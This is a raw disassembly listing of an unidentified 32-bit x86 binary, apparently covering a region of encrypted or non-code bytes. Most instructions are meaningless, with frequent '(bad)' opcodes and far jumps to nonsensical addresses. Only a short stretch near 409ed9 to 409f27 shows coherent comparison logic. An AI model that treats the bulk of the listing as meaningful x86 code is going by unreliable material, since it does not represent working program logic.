  409b2f:	rol    DWORD PTR [ecx+0x792765ed],1
  409b35:	mov    WORD PTR [eax],fs
  409b37:	and    esp,esi
  409b39:	mov    dl,0xe8
  409b3b:	shl    DWORD PTR [edi],cl
  409b3d:	push   ebp
  409b3e:	jne    0x409b45
  409b40:	stc    
  409b41:	jmp    0x409ae2
  409b43:	sub    eax,DWORD PTR [edx+0x54]
  409b46:	or     edi,DWORD PTR es:[ebx+0x26]
  409b4a:	sbb    al,BYTE PTR [ebx-0x76]
  409b4d:	add    al,0x72
  409b4f:	rol    DWORD PTR [eax-0x438c29db],cl
  409b55:	or     al,0x7e
  409b57:	jle    0x409b9e
  409b59:	sub    eax,0xcb6c5e6c
  409b5e:	jmp    0x833e:0x2ed1e04
  409b65:	push   ds
  409b66:	loope  0x409b88
  409b68:	ja     0xf161c9b
  409b6e:	lds    esi,FWORD PTR [ebx]
  409b70:	dec    bx
  409b72:	int    0x91
  409b74:	out    dx,al
  409b75:	inc    ebx
  409b76:	jmp    0x409bc6
  409b78:	mov    DWORD PTR [ebp-0x33],edx
  409b7b:	push   es
  409b7c:	scas   al,BYTE PTR es:[edi]
  409b7d:	ds jmp 0x53f45286
  409b83:	xor    BYTE PTR [eax],dh
  409b85:	lods   eax,DWORD PTR ds:[esi]
  409b86:	test   ah,0x54
  409b89:	test   DWORD PTR [eax-0x4d],0x138a16e2
  409b90:	jecxz  0x409bb3
  409b92:	popa   
  409b93:	iret   
  409b94:	sbb    al,al
  409b96:	popf   
  409b97:	mov    al,ds:0x30b244e4
  409b9c:	mov    al,0xaa
  409b9e:	sub    ah,BYTE PTR [eax-0x1ea68a2c]
  409ba4:	jp     0x409b3f
  409ba6:	or     cl,ch
  409ba8:	push   edi
  409ba9:	mov    dl,0x81
  409bab:	sbb    ebx,DWORD PTR [ebx+ebx*4+0x18]
  409baf:	and    al,0x45
  409bb1:	dec    ebx
  409bb2:	test   DWORD PTR [edi+0x685aa227],0x3e395a77
  409bbc:	test   ebx,0x70fd8083
  409bc2:	(bad)  
  409bc5:	(bad)  
  409bc6:	nop
  409bc7:	inc    esp
  409bc8:	outs   dx,BYTE PTR ds:[esi]
  409bc9:	fnstenv [edx+0x5a530484]
  409bcf:	mov    ds:0x1ac4d606,eax
  409bd4:	jo     0x409b8e
  409bd6:	retf   
  409bd7:	inc    ecx
  409bd8:	fldenv [ecx]
  409bda:	xchg   DWORD PTR [ebp-0x6ed44cc1],eax
  409be0:	mov    ah,0x12
  409be2:	je     0x409c28
  409be4:	imul   ecx,DWORD PTR [esp],0x9
  409be8:	outs   dx,BYTE PTR ds:[esi]
  409be9:	push   ss
  409bea:	jno    0x409bcf
  409bec:	fadd   QWORD PTR [ecx]
  409bee:	rol    BYTE PTR [esi+eiz*4-0xe5053e4],1
  409bf5:	int    0x27
  409bf7:	pop    edi
  409bf8:	push   cs
  409bf9:	jmp    0x409b8f
  409bfb:	mov    ebp,0xe91b80d6
  409c00:	add    edi,edi
  409c02:	and    al,0xf7
  409c04:	inc    edx
  409c05:	stos   DWORD PTR es:[edi],eax
  409c06:	push   0x914bd2a8
  409c0b:	fisttp WORD PTR [edi+0x779bdb61]
  409c11:	mov    ecx,0x23698e19
  409c16:	jmp    0xe7a6:0x79e8d6a4
  409c1d:	leave  
  409c1e:	gs xchg edi,eax
  409c20:	ins    BYTE PTR es:[edi],dx
  409c21:	ret    
  409c22:	jl     0x409bf6
  409c24:	lahf   
  409c25:	sbb    eax,0x835efe4e
  409c2a:	imul   esp,DWORD PTR [di-0x2958],0xffffff9d
  409c30:	xchg   ebp,eax
  409c31:	push   ebp
  409c32:	sbb    esp,DWORD PTR [ecx+edx*1]
  409c35:	sbb    al,0x19
  409c37:	mov    al,0x6b
  409c39:	sub    ch,ah
  409c3b:	jb     0x409bec
  409c3d:	(bad)  
  409c3e:	sub    dh,cl
  409c40:	retf   0x1dc0
  409c43:	mov    ebx,0x21260a0c
  409c48:	inc    edi
  409c49:	jl     0x409c09
  409c4b:	and    DWORD PTR [ecx+0x4f],edx
  409c4e:	sbb    BYTE PTR [esi],0x49
  409c51:	(bad)  
  409c52:	mov    eax,ds:0x90348d17
  409c57:	push   edi
  409c58:	dec    esi
  409c59:	scas   al,BYTE PTR es:[edi]
  409c5a:	inc    ecx
  409c5b:	das    
  409c5c:	sbb    dl,BYTE PTR [ecx-0x35]
  409c5f:	pop    edx
  409c60:	fdiv   QWORD PTR [esi]
  409c62:	sub    al,0x85
  409c64:	retf   0x7c6b
  409c67:	(bad)  
  409c68:	sub    ebp,DWORD PTR [ecx-0x66fae6b5]
  409c6e:	mov    ecx,0x77b21c91
  409c73:	ds std 
  409c75:	sub    edi,DWORD PTR [esi-0x62f25e99]
  409c7b:	sub    dl,bl
  409c7d:	and    al,0x88
  409c7f:	cmp    al,0xb
  409c81:	pop    esp
  409c82:	call   0xadc:0x66637411
  409c89:	(bad)  
  409c8a:	jae    0x409c83
  409c8c:	mov    DWORD PTR ss:[ecx],ebx
  409c8f:	shl    DWORD PTR [ebx-0x6a],0xd8
  409c93:	xchg   edx,eax
  409c94:	mov    ds:0x13c9feba,al
  409c99:	lods   eax,DWORD PTR ds:[esi]
  409c9a:	cld    
  409c9b:	cmp    esi,DWORD PTR [esi-0x7cead5a2]
  409ca1:	call   0xc0cf:0xf813d22f
  409ca8:	std    
  409ca9:	dec    ebx
  409caa:	mov    esi,0x6b95e589
  409caf:	out    0x54,eax
  409cb1:	xchg   BYTE PTR [edx+0x2bc37620],dh
  409cb7:	leave  
  409cb8:	jae    0x409c6d
  409cba:	or     BYTE PTR [ebp+0x68],cl
  409cbd:	test   DWORD PTR [edx],edx
  409cbf:	adc    DWORD PTR [eax],ecx
  409cc1:	test   DWORD PTR [ebx-0x5615f0d],0xd4c498c4
  409ccb:	mov    eax,ds:0xcf37d3b3
  409cd0:	push   ebx
  409cd1:	push   esp
  409cd2:	lods   eax,DWORD PTR ds:[esi]
  409cd3:	xchg   edi,eax
  409cd4:	imul   eax,DWORD PTR [ecx+edi*8],0xa2d6278c
  409cdb:	mov    cl,0x1a
  409cdd:	push   ss
  409cde:	jmp    0x417f:0x1c743e39
  409ce5:	int3   
  409ce6:	int    0x82
  409ce8:	cwde   
  409ce9:	sub    eax,0xb7735867
  409cee:	dec    esp
  409cef:	adc    DWORD PTR [edx],esp
  409cf1:	add    esi,ebp
  409cf3:	or     bh,0x29
  409cf6:	je     0x409ca0
  409cf8:	aaa    
  409cf9:	add    DWORD PTR [ebx+0x4c],edi
  409cfc:	neg    BYTE PTR ds:0x385e71bd
  409d02:	(bad)  
  409d04:	sub    ah,BYTE PTR [edx]
  409d06:	(bad)  
  409d08:	test   ah,0x5a
  409d0b:	je     0x409d05
  409d0d:	je     0x409d87
  409d0f:	mov    dl,0x71
  409d11:	xor    cl,BYTE PTR [eax-0x26]
  409d14:	mov    dh,0x44
  409d16:	fist   DWORD PTR [ebp-0x50f19936]
  409d1c:	sub    BYTE PTR [eax-0x21d022d9],0x90
  409d23:	addr16 pop ss
  409d25:	xlat   BYTE PTR ds:[ebx]
  409d26:	out    dx,al
  409d27:	push   es
  409d28:	add    DWORD PTR [edi+ebp*8+0x418037da],edi
  409d2f:	fs xchg ecx,eax
  409d31:	fadd   DWORD PTR [ebp-0x5615df30]
  409d37:	das    
  409d38:	int3   
  409d39:	fisub  DWORD PTR [ebx-0x43]
  409d3c:	mov    bl,0x26
  409d3e:	xchg   ebp,eax
  409d3f:	scas   al,BYTE PTR es:[edi]
  409d40:	inc    esp
  409d41:	mov    ds:0x4af69900,al
  409d46:	sti    
  409d47:	(bad)  
  409d48:	xor    eax,0x323c33b5
  409d4d:	jo     0x409d71
  409d4f:	cdq    
  409d50:	aas    
  409d51:	add    ah,BYTE PTR [ecx]
  409d53:	lods   eax,DWORD PTR ds:[esi]
  409d54:	dec    edx
  409d55:	mov    ds:0x57f7a54b,al
  409d5a:	fxch   st(2)
  409d5c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  409d5e:	cmp    eax,0xb305f16b
  409d63:	jmp    0x409d86
  409d65:	push   esi
  409d66:	int3   
  409d67:	or     bl,BYTE PTR [edi+0x2d]
  409d6a:	iret   
  409d6b:	iret   
  409d6c:	cmp    edx,DWORD PTR [eax]
  409d6e:	and    al,0xdb
  409d70:	pusha  
  409d71:	pusha  
  409d72:	mov    eax,ds:0x68e7e7c3
  409d77:	ret    0xc7cf
  409d7a:	fld    DWORD PTR [eax+0x2d49b966]
  409d80:	fwait
  409d81:	mov    ch,0x9
  409d83:	inc    esp
  409d84:	out    0x82,al
  409d86:	(bad)  
  409d88:	jo     0x409d73
  409d8a:	cmp    esp,ecx
  409d8c:	fstp   QWORD PTR [edi+0x27c24224]
  409d92:	in     eax,0xe2
  409d94:	sti    
  409d95:	sbb    al,ah
  409d97:	dec    edx
  409d98:	arpl   WORD PTR [edi+edi*2],cx
  409d9b:	push   edx
  409d9c:	ja     0x409d88
  409d9e:	pop    esp
  409d9f:	pop    esp
  409da0:	or     edi,DWORD PTR [eax]
  409da2:	adc    al,0x97
  409da4:	mov    WORD PTR [edx-0x11174f08],es
  409daa:	cmc    
  409dab:	clc    
  409dac:	mov    es,edx
  409dae:	int    0x30
  409db0:	in     eax,0x30
  409db2:	mov    ah,0x6c
  409db4:	add    esp,esi
  409db6:	out    0xf0,al
  409db8:	call   0xfbff66
  409dbd:	push   esi
  409dbe:	pushf  
  409dbf:	xchg   ebp,eax
  409dc0:	sub    ecx,DWORD PTR [edi+0x24f6cf90]
  409dc6:	and    BYTE PTR [eax+0x50],0x3c
  409dca:	sub    BYTE PTR [edx],ch
  409dcc:	mov    al,ds:0x775e30c9
  409dd1:	sub    DWORD PTR [edi],esp
  409dd3:	clc    
  409dd4:	es adc eax,0x38276b19
  409dda:	ds add al,0x74
  409ddd:	and    ecx,DWORD PTR [edx-0x5b]
  409de0:	outs   dx,DWORD PTR ds:[esi]
  409de1:	pop    ds
  409de2:	adc    BYTE PTR [ebx-0xc],al
  409de5:	cmp    DWORD PTR [esi-0x4a],eax
  409de8:	cli    
  409de9:	sbb    al,0xe5
  409deb:	jmp    0x409e32
  409ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dee:	jmp    0xfbc80458
  409df3:	cli    
  409df4:	dec    edx
  409df5:	xchg   edi,eax
  409df6:	in     al,dx
  409df7:	in     eax,0x66
  409df9:	jns    0x409e36
  409dfb:	xor    eax,0xbe761c14
  409e00:	pop    ss
  409e01:	inc    ecx
  409e02:	retf   0x38d3
  409e05:	push   edx
  409e06:	push   ebp
  409e07:	sub    ebx,DWORD PTR [esi-0x6c048e6e]
  409e0d:	jns    0x409db7
  409e0f:	fs pop edi
  409e11:	sub    al,dl
  409e13:	je     0x409d9f
  409e15:	xchg   edx,eax
  409e16:	mov    al,0x48
  409e18:	stc    
  409e19:	or     cl,ah
  409e1b:	mov    dl,0xc
  409e1d:	shl    DWORD PTR [esi+ebp*1-0x69ec51ed],1
  409e24:	fcomp  DWORD PTR [eax+0x6767cbca]
  409e2a:	pushf  
  409e2b:	dec    esp
  409e2c:	(bad)  
  409e2d:	mov    ds:0x8c757a39,eax
  409e32:	mov    ebp,DWORD PTR [ecx+ebx*2+0x3d]
  409e36:	ds adc eax,0xbbe9f1b8
  409e3c:	xchg   esp,eax
  409e3d:	add    eax,DWORD PTR [ecx+0x5143459c]
  409e43:	inc    edi
  409e44:	sbb    al,0x77
  409e46:	int    0xba
  409e48:	mov    bl,0xaa
  409e4a:	popf   
  409e4b:	lds    eax,FWORD PTR [edi-0x20052291]
  409e51:	xor    ebx,DWORD PTR [edi+edi*4-0x76d54a66]
  409e58:	mov    al,ah
  409e5a:	xchg   edx,eax
  409e5b:	int3   
  409e5c:	cmp    dh,ah
  409e5e:	outs   dx,DWORD PTR ds:[esi]
  409e5f:	and    ecx,DWORD PTR [edi+0x7428e0ce]
  409e65:	jo     0x409e8c
  409e67:	jo     0x409df0
  409e69:	xchg   edx,eax
  409e6a:	icebp  
  409e6b:	(bad)  
  409e6c:	int3   
  409e6d:	out    0xab,al
  409e6f:	sahf   
  409e70:	clc    
  409e71:	jle    0x409dfe
  409e73:	je     0x409e49
  409e75:	adc    eax,0xf084e68a
  409e7a:	loope  0x409ed4
  409e7c:	out    dx,al
  409e7d:	xor    ch,BYTE PTR [esi]
  409e7f:	repnz fistp QWORD PTR [ebx-0x22]
  409e83:	or     BYTE PTR [esi],ch
  409e85:	sub    eax,0xd0c9c326
  409e8a:	in     al,dx
  409e8b:	jne    0x409e84
  409e8d:	pop    esp
  409e8e:	ret    0xe334
  409e91:	enter  0x1821,0x19
  409e95:	inc    edx
  409e96:	push   es
  409e97:	out    0x4b,al
  409e99:	fnstcw WORD PTR [eax+0x4]
  409e9c:	cmp    edx,DWORD PTR [ebx+ebx*4]
  409e9f:	jo     0x409e6f
  409ea1:	mov    dh,0xc3
  409ea3:	pusha  
  409ea4:	push   es
  409ea5:	pop    DWORD PTR [eax]
  409ea7:	and    DWORD PTR [ebx+0x7],ebx
  409eaa:	fwait
  409eab:	popa   
  409eac:	dec    ebx
  409ead:	repz xor dh,BYTE PTR [esi]
  409eb0:	jne    0x409e8a
  409eb2:	mov    ch,0xeb
  409eb4:	scas   al,BYTE PTR es:[edi]
  409eb5:	xchg   esi,eax
  409eb6:	je     0x409e86
  409eb8:	(bad)  
  409eb9:	ins    BYTE PTR es:[edi],dx
  409eba:	jne    0x409f00
  409ebc:	int    0xc3
  409ebe:	fistp  QWORD PTR [esi+0x1351e43e]
  409ec4:	dec    eax
  409ec5:	dec    edi
  409ec6:	pop    es
  409ec7:	add    al,0xc6
  409ec9:	test   BYTE PTR [ebp-0x19],al
  409ecc:	mov    ah,0x9d
  409ece:	jmp    0x409e54
  409ed0:	xor    esp,DWORD PTR [eax+0x4b]
  409ed3:	in     eax,0xbc
  409ed5:	cmp    BYTE PTR [edi-0x5e],0xb2
  409ed9:	inc    ecx
  409eda:	mov    ecx,DWORD PTR [ebp-0x30]
  409edd:	xor    eax,esi
  409edf:	add    eax,edi
  409ee1:	cmp    ecx,eax
  409ee3:	je     0x409f21
  409ee9:	jmp    0x409f12
  409eee:	mov    eax,DWORD PTR [ebp-0x4]
  409ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  409ef4:	xor    eax,esi
  409ef6:	add    eax,edi
  409ef8:	cmp    ecx,eax
  409efa:	mov    eax,DWORD PTR [ebp-0x4]
  409efd:	je     0x40c2e1
  409f03:	mov    ecx,DWORD PTR [ebp-0x38]
  409f06:	xor    eax,esi
  409f08:	add    eax,edi
  409f0a:	cmp    ecx,eax
  409f0c:	je     0x40c2ea
  409f12:	lea    eax,[ebp-0x8]
  409f15:	push   eax
  409f16:	push   DWORD PTR [ebp-0x30]
  409f19:	push   DWORD PTR [ebp+0xc]
  409f1c:	call   0x41169e
  409f21:	mov    eax,DWORD PTR [ebp-0x4]
  409f24:	mov    ecx,DWORD PTR [ebp-0x8]
  409f27:	jmp    0x40c2ac
  409f2c:	inc    DWORD PTR [ebp+edi*2+0x29]
  409f30:	(bad)
  409f33:	je     0x409f70
  409f35:	fs and eax,0xfa4ff1f0
  409f3b:	fwait
  409f3c:	xor    al,BYTE PTR [eax]
  409f3e:	jp     0x409fba
  409f40:	add    bl,BYTE PTR [edi+0x7a]
  409f43:	jp     0x409ed8
  409f45:	imul   ebp,edx
  409f48:	cmc    
  409f49:	jmp    0xd5c4:0x615a1c17
  409f50:	cli    
  409f51:	fdiv   DWORD PTR [ecx+0x54]
  409f54:	mov    dl,0xf7
  409f56:	in     eax,0x9d
  409f58:	in     al,dx
  409f59:	push   0x7993a567
  409f5e:	rol    DWORD PTR [esi-0x7a],0xb9
  409f62:	xor    edi,esp
  409f64:	push   0xffffff93
  409f66:	adc    al,0xbc
  409f68:	test   DWORD PTR [ebx+esi*4-0x3c],0xb384e9db
  409f70:	push   es
  409f71:	mov    ebp,0xfc072a81
  409f76:	dec    edx
  409f77:	inc    eax
  409f78:	sub    edx,DWORD PTR [esi+0x14ff6a7b]
  409f7e:	lods   al,BYTE PTR ds:[esi]
  409f7f:	xchg   ecx,eax
  409f80:	xor    BYTE PTR [ecx+ebp*1],dl
  409f83:	add    eax,0xcd03dec2
  409f88:	add    DWORD PTR [eax],edi
  409f8a:	sub    eax,ebp
  409f8c:	inc    edi
  409f8d:	sbb    DWORD PTR [ebp-0x3b6ad00a],eax
  409f93:	rcr    DWORD PTR ds:0x42428a91,0x89
  409f9a:	aas    
  409f9b:	fild   QWORD PTR [ebx+0x62]
  409f9e:	or     eax,0xe0f36789
  409fa3:	int3   
  409fa4:	mov    edx,0xb3cfed37
  409fa9:	fcomi  st,st(6)
  409fab:	dec    DWORD PTR [eax+0x3d]
  409fae:	cmp    al,0x2b
  409fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb1:	jp     0x409fdb
  409fb3:	dec    esi
  409fb4:	stc    
  409fb5:	test   DWORD PTR [eax+0x5ee2123c],edx
  409fbb:	or     eax,0x4de2fa18
  409fc0:	lahf   
  409fc1:	shl    BYTE PTR [ebx+0x8d06c9b],1
  409fc7:	ins    BYTE PTR es:[edi],dx
  409fc8:	or     DWORD PTR [eax],ebp
  409fca:	repz (bad) 
  409fcc:	and    ebp,DWORD PTR [ecx]
  409fce:	mov    dl,BYTE PTR [eax+ecx*4]
  409fd1:	(bad)  
  409fd2:	imul   cl
  409fd4:	mov    ah,0x2e
  409fd6:	push   0xcd0d2261
  409fdb:	pop    edx
  409fdc:	or     ch,BYTE PTR [edx+0x2e]
  409fdf:	dec    edi
  409fe0:	pop    ss
  409fe1:	xor    al,BYTE PTR [esi+0xda8a85]
  409fe7:	pushf  
  409fe8:	xchg   ebx,eax
  409fe9:	popa   
  409fea:	sbb    al,0xac
  409fec:	fstp   QWORD PTR es:[ecx-0x12]
  409ff0:	lock mov ds:0xc2def77f,eax
  409ff6:	fs sub al,0x4
  409ff9:	xor    eax,0xc0f80499
  409ffe:	jmp    0x2aba1f83
  40a003:	(bad)  
  40a004:	es mov cl,0xe4
  40a007:	or     DWORD PTR [eax],0x88afd4b8
  40a00d:	mov    edx,0xed453ee5
  40a012:	ss loopne 0x409f9a
  40a015:	(bad)  
  40a016:	das    
  40a017:	pushf  
  40a018:	push   esp
  40a019:	leave  
  40a01a:	ret    0xeff8
  40a01d:	inc    ebx
  40a01e:	std    
  40a01f:	sub    DWORD PTR [ebx-0x54017e58],0xffffffc1
  40a026:	sbb    ah,BYTE PTR [esi+esi*4]
  40a029:	mov    edx,0x805b8c83
  40a02e:	test   DWORD PTR [edi+ecx*8],eax
  40a031:	dec    edi
  40a032:	jne    0x40a06f
  40a034:	dec    esi
  40a035:	sbb    eax,0xcc5613cf
  40a03a:	in     al,dx
  40a03b:	xchg   bl,bh
  40a03d:	gs iret 
  40a03f:	adc    eax,DWORD PTR [esi+0x52]
  40a042:	mov    dl,0xa6
  40a044:	and    BYTE PTR [edi-0x3b],bl
  40a047:	add    al,0xfa
  40a049:	stos   BYTE PTR es:[edi],al
  40a04a:	xchg   esp,eax
  40a04b:	fstp   st(4)
  40a04d:	js     0x40a01d
  40a04f:	xlat   BYTE PTR ds:[ebx]
  40a050:	jmp    0xf7ed:0x94ea8c71
  40a057:	pop    ebx
  40a058:	jno    0x40a048
  40a05a:	int3   
  40a05b:	adc    esi,eax
  40a05d:	ret    0x861
  40a060:	push   cs
  40a061:	lock (bad) 
  40a063:	mov    bh,0x16
  40a065:	rcl    BYTE PTR [ebx+ebp*1],cl
  40a068:	or     BYTE PTR [edi+0x5e983374],ch
  40a06e:	xchg   edi,eax
  40a06f:	inc    ecx
  40a070:	cmp    BYTE PTR [edi+0x3f],bl
  40a073:	loope  0x40a0f1
  40a075:	pop    ecx
  40a076:	xchg   edx,eax
  40a077:	inc    ebp
  40a078:	dec    esp
  40a079:	sub    eax,0xa35df17f
  40a07e:	rcl    DWORD PTR [edi],cl
  40a080:	hlt    
  40a081:	or     eax,edi
  40a083:	cmp    dh,bh
  40a085:	pop    ecx
  40a086:	add    esp,DWORD PTR [ecx-0x27]
  40a089:	loope  0x40a0fb
  40a08b:	and    eax,0xb96a1e2b
  40a090:	mov    bl,0xd4
  40a092:	js     0x40a0b3
  40a094:	icebp  
  40a095:	xor    dh,BYTE PTR [ebp+0x7d]
  40a098:	mov    ecx,0x7ad9869c
  40a09d:	mov    al,ds:0x1384b221
  40a0a2:	xchg   BYTE PTR [eax+ecx*1+0x2ce66ab1],bh
  40a0a9:	(bad)  
  40a0aa:	int3   
  40a0ab:	aaa    
  40a0ac:	fxtract 
  40a0ae:	enter  0xa428,0x12
  40a0b2:	push   cs
  40a0b3:	mov    ecx,DWORD PTR [esi+eiz*4-0x29]
  40a0b7:	mov    DWORD PTR [edx+0x2ce21677],ebp
  40a0bd:	fwait
  40a0be:	lea    ecx,[edx-0x15]
  40a0c1:	ss pop esi
  40a0c3:	into   
  40a0c4:	sub    ebp,ecx
  40a0c6:	(bad)  
  40a0c7:	mov    edx,0xe879cf0d
  40a0cc:	push   ds
  40a0cd:	add    eax,0x2f84e467
  40a0d2:	in     eax,0xd3
  40a0d4:	sub    esi,ebp
  40a0d6:	xor    esi,ebx
  40a0d8:	xlat   BYTE PTR ds:[ebx]
  40a0d9:	arpl   WORD PTR [edi+edx*2],dx
  40a0dc:	std    
  40a0dd:	pop    esp
  40a0de:	mov    ds:0x86aded64,eax
  40a0e3:	outs   dx,DWORD PTR ds:[esi]
  40a0e4:	and    eax,0x19ce8716
  40a0e9:	or     eax,0xe5b3528
  40a0ee:	test   cl,bh
  40a0f0:	test   BYTE PTR ds:0xc78d8d87,al
  40a0f6:	call   DWORD PTR [esi]
  40a0f8:	pop    ebp
  40a0f9:	pop    esp
  40a0fa:	mov    ds:0x8e8b628c,al
  40a0ff:	(bad)  
  40a100:	loop   0x40a118
  40a102:	retf   0x43f4
  40a105:	pusha  
  40a106:	adc    DWORD PTR [esi],0x9ea5ff64
  40a10c:	fimul  DWORD PTR [eax]
  40a10e:	pop    edx
  40a10f:	pop    edi
  40a110:	sub    eax,0x6b1aa60c
  40a115:	mov    ebp,DWORD PTR ds:0x56b33404
  40a11b:	popa   
  40a11c:	stos   DWORD PTR es:[edi],eax
  40a11d:	mov    cl,0x65
  40a11f:	or     al,BYTE PTR [ecx+esi*1+0x4b2d8eca]
  40a126:	cli    
  40a127:	mov    eax,ds:0x36b6dd87
  40a12c:	imul   esi,edi,0xffffffa7
  40a12f:	mov    ch,0x96
  40a131:	xchg   edx,eax
  40a132:	pop    eax
  40a133:	push   0xcec58042
  40a138:	adc    eax,0xef30fb69
  40a13d:	pop    edx
  40a13e:	fisubr DWORD PTR [eax+eiz*8]
  40a141:	xor    bh,BYTE PTR [ecx]
  40a143:	push   esp
  40a144:	sbb    ah,BYTE PTR [ecx]
  40a146:	adc    eax,0xf5fd10ae
  40a14b:	adc    BYTE PTR [ebx+0x225ee56c],bl
  40a151:	pop    ss
  40a152:	adc    eax,0x35235fda
  40a157:	scas   eax,DWORD PTR es:[edi]
  40a158:	sti    
  40a159:	je     0x40a15d
  40a15b:	sub    ebx,DWORD PTR [ebx]
  40a15d:	pop    ds
  40a15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15f:	sub    eax,0xcc05074c
  40a164:	leave  
  40a165:	sbb    bh,BYTE PTR [ebx-0x62]
  40a168:	inc    edi
  40a169:	mov    bl,0x96
  40a16b:	jo     0x40a1e8
  40a16d:	sbb    BYTE PTR [ebx],ah
  40a16f:	mov    cl,0x61
  40a171:	or     bl,al
  40a173:	pusha  
  40a174:	loopne 0x40a161
  40a176:	ror    BYTE PTR [eax-0x63],cl
  40a179:	cwde   
  40a17a:	xor    DWORD PTR [edx+0x48942e80],esp
  40a180:	shr    BYTE PTR [eax-0x3a9cdfe8],1
  40a186:	iret   
  40a187:	push   0x9e77e1c1
  40a18c:	jmp    DWORD PTR [ecx]
  40a18e:	leave  
  40a18f:	mov    ch,0x91
  40a191:	fwait
  40a192:	jp     0x40a1d1
  40a194:	mov    cl,0xea
  40a196:	lods   al,BYTE PTR ds:[esi]
  40a197:	dec    ebx
  40a198:	push   0xffffffa5
  40a19a:	mov    DWORD PTR ds:0x7a748de0,ecx
  40a1a0:	push   ebx
  40a1a1:	mov    bl,0x8d
  40a1a3:	loope  0x40a1ec
  40a1a5:	cmp    al,0xd7
  40a1a7:	int3   
  40a1a8:	loope  0x40a1ff
  40a1aa:	jbe    0x40a1df
  40a1ac:	popa   
  40a1ad:	ins    DWORD PTR es:[edi],dx
  40a1ae:	add    bl,BYTE PTR [esi+0x1b815a54]
  40a1b4:	push   gs
  40a1b6:	in     eax,dx
  40a1b7:	aam    0x4c
  40a1b9:	cli    
  40a1ba:	call   0x588bb71e
  40a1bf:	mov    DWORD PTR [edx-0x74],esp
  40a1c2:	dec    ecx
  40a1c3:	cmp    BYTE PTR [ebx-0x9],bl
  40a1c6:	idiv   DWORD PTR [eax-0x27462a46]
  40a1cc:	in     al,dx
  40a1cd:	mov    ds:0xb296,eax
  40a1d2:	sub    eax,0x76733dfd
  40a1d7:	xlat   BYTE PTR ds:[ebx]
  40a1d8:	adc    al,0x59
  40a1da:	sbb    ah,cl
  40a1dc:	push   edi
  40a1dd:	adc    ch,cl
  40a1df:	int3   
  40a1e0:	test   DWORD PTR ds:0x20f0fe1e,esi
  40a1e6:	and    DWORD PTR [ebx-0x58588fd3],ebx
  40a1ec:	ror    bl,cl
  40a1ee:	pop    ecx
  40a1ef:	ss add eax,0xdf237b07
  40a1f5:	xor    dh,dh
  40a1f7:	xor    al,0x99
  40a1f9:	mov    al,0x7
  40a1fb:	(bad)  
  40a1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1fd:	add    ecx,ebx
  40a1ff:	mov    esi,DWORD PTR [ecx-0x5e4465e1]
  40a205:	data16 mov al,ds:0x357b35ea
  40a20b:	and    eax,0xc05ec715
  40a210:	cmp    al,BYTE PTR [edx]
  40a212:	jne    0x40a1c3
  40a214:	pop    ecx
  40a215:	loope  0x40a28f
  40a217:	imul   cl
  40a219:	icebp  
  40a21a:	pop    ds
  40a21b:	jmp    0x40a1c9
  40a21d:	outs   dx,DWORD PTR ds:[esi]
  40a21e:	and    ch,BYTE PTR [esp]
  40a221:	aas    
  40a222:	scas   al,BYTE PTR es:[edi]
  40a223:	sbb    ch,cl
  40a225:	xor    DWORD PTR [ebx-0x8],eax
  40a228:	call   0xeaf8:0x6dc57a3f
  40a22f:	cmc    
  40a230:	je     0x40a27a
  40a232:	jmp    0x40a252
  40a234:	mov    DWORD PTR [ecx-0x58c2c41d],esi
  40a23a:	out    0x44,al
  40a23c:	lea    esp,[esp+ebp*1-0x6c]
  40a240:	mov    ch,0x76
  40a242:	loopne 0x40a1c7
  40a244:	sub    eax,0xdf100606
  40a249:	(bad)  
  40a24a:	ror    BYTE PTR [ebx+0x6c],1
  40a24d:	cmp    ebx,DWORD PTR [ecx-0x463cbfbe]
  40a253:	xor    bh,al
  40a255:	sbb    BYTE PTR [eax],bl
  40a257:	ss xchg ebx,eax
  40a259:	iret   
  40a25a:	mov    esp,0xacbd9ec9
  40a25f:	(bad)  
  40a260:	jl     0x40a209
  40a262:	les    edx,FWORD PTR [ecx-0x3e86f84a]
  40a268:	pusha  
  40a269:	aas    
  40a26a:	inc    ebp
  40a26b:	add    eax,0xaa4d58ac
  40a270:	adc    eax,0xd0d0dea1
  40a275:	inc    ecx
  40a276:	pop    eax
  40a277:	daa    
  40a278:	gs push esp
  40a27a:	push   0x87fd61c
  40a27f:	aam    0x36
  40a281:	fwait
  40a282:	ja     0x40a29f
  40a284:	shl    BYTE PTR [esi],cl
  40a286:	stc    
  40a287:	xchg   edx,eax
  40a288:	mov    eax,ebp
  40a28a:	push   ebx
  40a28b:	pop    es
  40a28c:	ja     0x40a228
  40a28e:	sub    ecx,DWORD PTR [edx+ecx*1+0x11]
  40a292:	pop    ebx
  40a293:	xor    DWORD PTR [eax-0x158d36c],esi
  40a299:	inc    esi
  40a29a:	cmc    
  40a29b:	inc    esp
  40a29c:	lahf   
  40a29d:	ret    0x5456
  40a2a0:	mov    BYTE PTR [si+0x9],0xa8
  40a2a5:	adc    BYTE PTR [ebx-0xb10e13],bh
  40a2ab:	mov    ds:0x3119d914,eax
  40a2b0:	dec    esp
  40a2b1:	cld    
  40a2b2:	mov    eax,ds:0xa16acbb6
  40a2b7:	pop    es
  40a2b8:	ret    0x74db
  40a2bb:	sbb    BYTE PTR [ebp-0x99ace80],ah
  40a2c1:	inc    edi
  40a2c2:	mov    ebx,0xd4b949e3
  40a2c7:	and    esp,esp
  40a2c9:	sbb    DWORD PTR [esi-0x2fa1f98],eax
  40a2cf:	mov    gs,WORD PTR [ebp+0x51374366]
  40a2d5:	dec    esi
  40a2d6:	adc    ch,BYTE PTR [esi+0x1bfad974]
  40a2dc:	es test edx,ebp
  40a2df:	push   ecx
  40a2e0:	adc    BYTE PTR [ebx+0x41e0a9e2],cl
  40a2e6:	xchg   esp,eax
  40a2e7:	inc    edi
  40a2e8:	fadd   DWORD PTR [eax]
  40a2ea:	aam    0x87
  40a2ec:	mov    al,0x76
  40a2ee:	sbb    al,0x23
  40a2f0:	jmp    0xce1cffd5
  40a2f5:	inc    esp
  40a2f6:	push   ebp
  40a2f7:	lea    eax,[eax+0x72]
  40a2fa:	cmp    BYTE PTR [edx-0x6d2697c2],bh
  40a300:	or     BYTE PTR [eax-0x72],0x96
  40a304:	mov    dh,0xab
  40a306:	data16 mov bl,0x6f
  40a309:	test   al,0x57
  40a30b:	sub    al,0x6e
  40a30d:	cmc    
  40a30e:	and    al,0x6a
